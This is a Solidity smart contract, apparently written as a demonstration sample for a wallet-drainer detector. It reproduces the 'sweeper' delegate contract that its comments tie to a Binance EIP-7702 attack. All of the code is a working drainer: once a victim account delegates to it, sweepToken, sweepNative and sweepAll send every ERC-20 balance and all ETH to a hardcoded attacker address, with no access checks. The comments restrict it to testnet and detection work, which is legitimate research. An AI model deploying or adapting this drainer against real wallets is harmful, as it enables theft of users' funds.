// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * Sweeper — the malicious "delegate" contract from the Binance EIP-7702 attack.
 *
 * In the real hack the victim hot wallet (Binance 14) was delegated, via EIP-7702,
 * to a contract like this one. Once the delegation is in place, the victim account
 * RUNS this code as if it were its own. Calling `sweep` then drains the account's
 * ERC-20 balance (and native ETH) to a hardcoded attacker address.
 *
 * This is the textbook "sweeper" shape The Blacklist flags:
 *   - tiny
 *   - no owner / access checks
 *   - sends everything to one hardcoded address
 *
 * DO NOT deploy to mainnet. Sepolia test tokens only. Educational / hackathon use.
 */

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract Sweeper {
    // Hardcoded attacker destination. Set at deploy time.
    address public immutable ATTACKER;

    event Swept(address indexed victim, address indexed token, uint256 amount);
    event SweptNative(address indexed victim, uint256 amount);

    constructor(address attacker) {
        ATTACKER = attacker;
    }

    /// Drain a single ERC-20 token held by whoever is executing this code.
    /// After 7702 delegation, `address(this)` IS the victim account.
    function sweepToken(address token) public {
        uint256 bal = IERC20(token).balanceOf(address(this));
        if (bal > 0) {
            IERC20(token).transfer(ATTACKER, bal);
            emit Swept(address(this), token, bal);
        }
    }

    /// Drain several ERC-20 tokens in one call.
    function sweepTokens(address[] calldata tokens) external {
        for (uint256 i = 0; i < tokens.length; i++) {
            sweepToken(tokens[i]);
        }
    }

    /// Drain native ETH held by the (delegated) account.
    function sweepNative() public {
        uint256 bal = address(this).balance;
        if (bal > 0) {
            (bool ok, ) = ATTACKER.call{value: bal}("");
            require(ok, "native sweep failed");
            emit SweptNative(address(this), bal);
        }
    }

    /// Drain tokens + native in one shot (the full "empty the wallet" call).
    function sweepAll(address[] calldata tokens) external {
        for (uint256 i = 0; i < tokens.length; i++) {
            sweepToken(tokens[i]);
        }
        sweepNative();
    }

    receive() external payable {}
}
